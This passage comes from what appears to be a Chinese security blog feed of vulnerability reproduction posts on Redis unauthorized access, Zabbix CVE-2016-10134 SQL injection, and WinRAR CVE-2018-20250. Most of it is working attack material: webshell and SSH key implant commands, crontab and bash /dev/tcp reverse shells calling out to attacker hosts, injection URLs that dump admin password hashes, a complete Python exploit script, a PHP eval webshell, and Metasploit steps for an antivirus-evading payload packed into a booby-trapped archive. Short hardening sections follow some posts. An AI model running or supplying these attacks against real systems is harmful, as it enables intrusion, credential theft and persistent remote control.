class="line">bgsave#fork一个子进程来创建RDB文件，父进程可以继续处理命令请求。</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>save：会阻塞redis服务器进程，直到创建RDB文件完毕为止；（在此期间进程不能处理任何请求）<br>bgsave：命令执行之后立即返回 OK ，然后Redis fork 出一个新子进程，原来的Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出</p></blockquote><h2 id="五、攻击利用方式"><a href="#五、攻击利用方式" class="headerlink" title="五、攻击利用方式"></a>五、攻击利用方式</h2><h3 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="1. 写Webshell"></a>1. 写Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/#将rdb文件保存在/var/www/中</span><br><span class="line">CONFIG SET dbfilename redis.php#将rdb文件名修改为redis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;#往redis.php中写木马</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><h3 id="2-ssh配置免密登录"><a href="#2-ssh配置免密登录" class="headerlink" title="2. ssh配置免密登录"></a>2. ssh配置免密登录</h3><p>条件：</p><ul><li>Redis服务使用ROOT账号启动 </li><li>服务器开放SSH服务，而且允许密钥登录，即可远程写入一个公钥，直接登录远程服务器</li></ul><p>先在渗透主机上生成 <code>ssh</code>的私钥与公钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa//一直回车即可</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt# 保存公钥到hack.txt中</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # 把公钥写入到redis主机</span><br></pre></td></tr></table></figure><p>登陆访问redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><p>修改RDB存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>ssh远程连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>crontab周期性执行任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l#查看当前任务</span><br><span class="line">-r#删除任务</span><br><span class="line">-e#编辑</span><br><span class="line">6部分：分钟 小时 天 月 星期 命令/脚本</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure><p>查看当前任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">该文件内容等同于</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>写入crontab定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>攻击者服务端开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure><p><img src="/2019/05/15/Redis未授权访问漏洞/1557925558674.png" alt="1557925558674"></p><h2 id="六、修复"><a href="#六、修复" class="headerlink" title="六、修复"></a>六、修复</h2><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>避免使用<code>root</code>用户身份启动<code>Redis</code>服务，选择权限较低的用户运行<code>rides</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><h4 id="禁止命令"><a href="#禁止命令" class="headerlink" title="禁止命令"></a>禁止命令</h4><p>通过修改配置文件来禁止一些高风险的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="添加密码认证"><a href="#添加密码认证" class="headerlink" title="添加密码认证"></a>添加密码认证</h4><p>通过配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure><p>也可以通过 <code>Redis</code>的命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure><h4 id="禁止外网访问"><a href="#禁止外网访问" class="headerlink" title="禁止外网访问"></a>禁止外网访问</h4><p>通过防火墙等配置来禁止外网访问。</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>Redis</code>匿名访问漏洞由不安全的运维配置引起的，作为配置 <code>Redis</code>的开发人员或运维人员一定要有一定的安全意识，才能更好的实现真正的安全。</p><h2 id="八、参考文章："><a href="#八、参考文章：" class="headerlink" title="八、参考文章："></a>八、参考文章：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">Redis匿名访问漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-10134-zabbix-SQL注入漏洞复现</title>
      <link href="/2019/05/03/CVE-2016-10134-zabbix-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/05/03/CVE-2016-10134-zabbix-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><p>Zabbix 的latest.php中的toggle_ids[]或jsrpc.php中的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。</p><h2 id="二、漏洞条件"><a href="#二、漏洞条件" class="headerlink" title="二、漏洞条件"></a>二、漏洞条件</h2><p>版本：</p><ul><li>2.2.x</li><li>3.3.0-3.03</li></ul><h2 id="三、复现漏洞"><a href="#三、复现漏洞" class="headerlink" title="三、复现漏洞"></a>三、复现漏洞</h2><p>感谢<a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">Vulhub</a>提供的漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/vulhub/zabbix/CVE-2016-10134#注意自己的安装路径</span><br><span class="line">docker-compose up -d#启动zabbix3.0.3</span><br></pre></td></tr></table></figure><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558410510855.png" alt="1558410510855"></p><p>第一种方式需要：zabbix开启guest权限，guest的默认密码为空。</p><p>输入账号<code>guest</code>，密码为空，登陆游客账户。</p><p>登陆成功后，查看cookie中的<code>zbx_sessionid</code>，复制后16位字符</p><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558410873676.png" alt="1558410873676"></p><p>然后将<code>8a7f592d81c1ebd4</code>当作sid的值，访问如下链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/latest.php?output=ajax&amp;sid=8a7f592d81c1ebd4&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p>注入成功：</p><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558411124994.png" alt="1558411124994"></p><p>如果guset被禁用的话，还可以使用另一种注入方式，无需账号登录。通过jsrpc.php触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558411371613.png" alt="1558411371613"></p><p>管理员账号密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(1,substring((select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1,20),1)+or+1=1)%23</span><br></pre></td></tr></table></figure><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558415550757.png" alt="1558415550757"></p><p>updatexml()有32位长度限制,所以使用substring拼接得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~Admin~5fce1b3e34b520afeffb37ce08c7cd66~</span><br></pre></td></tr></table></figure><p>密码存储经过加密加盐的，从第九位开始算，截16个，去掉盐值，然后cmd5破解。</p><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558416909826.png" alt="1558416909826"></p><p>附上一个网上的exp，可以省点力气：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Date: 2016/8/18</span></span><br><span class="line"><span class="comment"># Created by 独自等待</span></span><br><span class="line"><span class="comment"># 博客 http://www.waitalone.cn/</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deteck_Sql</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">u'检查是否存在SQL注入'</span></span><br><span class="line">    payload = <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key_reg = re.compile(<span class="string">r"INSERT\s*INTO\s*profiles"</span>)</span><br><span class="line">        <span class="keyword">if</span> key_reg.findall(response):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_Inject</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="string">u'获取特定sql语句内容'</span></span><br><span class="line">    payload = url + <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2="</span> + urllib2.quote(</span><br><span class="line">        sql) + <span class="string">"&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result_reg = re.compile(<span class="string">r"Duplicate\s*entry\s*'~(.+?)~1"</span>)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        <span class="keyword">if</span> results:</span><br><span class="line">            <span class="keyword">return</span> results[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># os.system(['clear', 'cls'][os.name == 'nt'])</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t   Python Zabbix&lt;3.0.4 SQL注入 Exploit'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t    Blog：http://www.waitalone.cn/'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Code BY： 独自等待'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Time：2016-08-18'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'用法: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' Zabbix 网站地址'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'实例: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' http://www.waitalone.cn/'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] != <span class="string">'/'</span>: url += <span class="string">'/'</span></span><br><span class="line">    passwd_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    session_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    <span class="keyword">if</span> deteck_Sql():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 存在SQL注入漏洞!\n'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  用户名密码：%s'</span> % sql_Inject(passwd_sql)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  Session_id：%s'</span> % sql_Inject(session_sql)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 不存在SQL注入漏洞!\n'</span></span><br></pre></td></tr></table></figure><p>直接获取到密码和session_id</p><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558419601590.png" alt="1558419601590"></p><p>登陆进后台，可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 8989#攻击者服务器开启监听</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/8989 0&gt;&amp;1#设置反弹shell脚本</span><br><span class="line">#或者写一句话</span><br><span class="line">echo&quot;&lt;?php eval($_POST[cmd])?&gt;&quot; &gt; /usr/share/webapps/zabbix/shell.php</span><br></pre></td></tr></table></figure><p><img src="/2019/05/03/CVE-2016-10134-zabbix-SQL注入漏洞复现/zabbix-SQL注入-getshell-CVE-2016-10134/1558420615542.png" alt="1558420615542"></p><p>然后随便找台内网主机选择执行该脚本即可</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>1、禁用后台用户guest账号（第一种注入要求此账号启用）。</p><p>2、升级到zabbix的最新版。</p><p>3、zabbix的server和agent都不要以root启动</p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><p><a href="https://blog.csdn.net/csacs/article/details/86656618" target="_blank" rel="noopener">https://blog.csdn.net/csacs/article/details/86656618</a> </p></li><li><p><a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">https://vulhub.org/#/environments/zabbix/CVE-2016-10134/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250-WinRAR目录穿越漏洞复现</title>
      <link href="/2019/05/02/CVE-2018-20250-WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/05/02/CVE-2018-20250-WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure><p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p><h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p><p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p><a id="more"></a><p><em>漏洞细节</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p><h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure><h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p><h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p><p>按照首页的步骤建立如下连接</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p><h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p><p>使用Metasploit5自带的免杀模块生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p><p>把Payload文件放到EXP文件夹下的根目录</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p><p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p><p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p><p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p><p>Windows7靶机下载解压这个恶意压缩包：</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p><p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p><p>Windows7系统启动目录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>Metasploit启动远程监听主机上线请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p><p><img src="/2019/05/02/CVE-2018-20250-WinRAR目录穿越漏洞复现/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p><p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p><h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-心脏滴血漏洞</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
